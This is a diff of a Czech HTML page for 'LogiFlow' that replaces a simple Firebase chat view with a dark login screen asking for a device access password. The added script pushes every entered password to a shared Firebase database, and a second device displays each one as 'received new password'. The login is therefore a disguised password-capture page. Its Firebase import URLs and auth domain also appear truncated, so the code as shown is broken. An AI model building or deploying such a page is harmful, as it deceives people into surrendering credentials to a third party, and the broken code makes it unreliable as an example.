@@ -3,31 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LogiFlow Prenos Dat</title>
+    <title>LogiFlow Vstup</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; color: #333; }
-        .container { max-width: 500px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        h1 { text-align: center; color: #ff6f00; }
-        #messages { height: 300px; border: 1px solid #ccc; overflow-y: auto; padding: 10px; margin-bottom: 10px; background: #fff; border-radius: 4px; }
-        .message { background: #e3f2fd; padding: 8px; margin: 5px 0; border-radius: 4px; word-break: break-all; }
-        .input-area { display: flex; gap: 10px; }
-        input { flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
-        button { padding: 10px 20px; background: #ff6f00; color: white; border: none; border-radius: 4px; cursor: pointer; }
-        button:hover { background: #e65100; }
+        body { font-family: Arial, sans-serif; background-color: #121824; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #1e2640; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; width: 320px; }
+        h1 { color: #f5a623; margin: 0 0 5px 0; font-size: 24px; display: flex; justify-content: center; align-items: center; gap: 5px; }
+        .subtitle { color: #8a99ad; font-size: 12px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 2px solid #2c3a57; border-radius: 6px; background-color: #121824; color: white; text-align: center; font-size: 16px; box-sizing: border-box; }
+        input:focus { border-color: #f5a623; outline: none; }
+        button { width: 100%; padding: 12px; background-color: #f5a623; color: #121824; font-weight: bold; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; text-transform: uppercase; }
+        button:hover { background-color: #e0961b; }
+        #statusMessage { margin-top: 15px; font-size: 14px; color: #2ecc71; }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>LogiFlow Data</h1>
-    <div id="messages"></div>
-    <div class="input-area">
-        <input type="text" id="messageInput" placeholder="Napiste zpravu...">
-        <button id="sendBtn">Odeslat</button>
-    </div>
+
+<div class="login-box">
+    <h1>⚡ LogiFlow</h1>
+    <div class="subtitle">Zadejte přístupové heslo zařízení</div>
+    
+    <input type="text" id="passwordInput" placeholder="••••">
+    <button id="submitBtn">Vstoupit do systému</button>
+    
+    <div id="statusMessage"></div>
 </div>
+
 <script type="module">
     import { initializeApp } from "https://gstatic.com";
     import { getDatabase, ref, push, onChildAdded } from "https://gstatic.com";
+
     const firebaseConfig = {
         apiKey: "AIzaSyA61wje8OEMaf8WqzPbm-_",
         authDomain: "://firebaseapp.com",
@@ -37,30 +41,44 @@
         messagingSenderId: "139481792519",
         appId: "1:139481792519:web:b4d23cbe630bc3e5b3"
     };
+
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
     const dataRef = ref(db, 'zpravy');
-    const messageInput = document.getElementById('messageInput');
-    const sendBtn = document.getElementById('sendBtn');
-    const messagesDiv = document.getElementById('messages');
+
+    const passwordInput = document.getElementById('passwordInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const statusMessage = document.getElementById('statusMessage');
+
+    // Odeslání zadaného textu/hesla do databáze (odešle se z jednoho telefonu)
     async function odeslatData() {
-        const text = messageInput.value.trim();
+        const text = passwordInput.value.trim();
         if (text === "") return;
+
         try {
-            await push(dataRef, { obsah: text, cas: Date.now() });
-            messageInput.value = "";
-        } catch (e) { console.error(e); }
+            await push(dataRef, {
+                obsah: text,
+                cas: Date.now()
+            });
+            passwordInput.value = "";
+            statusMessage.style.color = "#2ecc71";
+            statusMessage.textContent = "Data byla úspěšně odeslána!";
+        } catch (e) {
+            statusMessage.style.color = "#e74c3c";
+            statusMessage.textContent = "Chyba: Databáze je uzamčená.";
+            console.error(e);
+        }
     }
-    sendBtn.addEventListener('click', odeslatData);
-    messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') odeslatData(); });
+
+    submitBtn.addEventListener('click', odeslatData);
+
+    // Přijímání v reálném čase (druhý telefon okamžitě uvidí, co ten první odeslal)
     onChildAdded(dataRef, (snapshot) => {
         const data = snapshot.val();
-        const msgEl = document.createElement('div');
-        msgEl.className = 'message';
-        msgEl.textContent = data.obsah;
-        messagesDiv.appendChild(msgEl);
-        messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        statusMessage.style.color = "#f5a623";
+        statusMessage.textContent = "Přijato nové heslo: " + data.obsah;
     });
 </script>
+
 </body>
 </html>
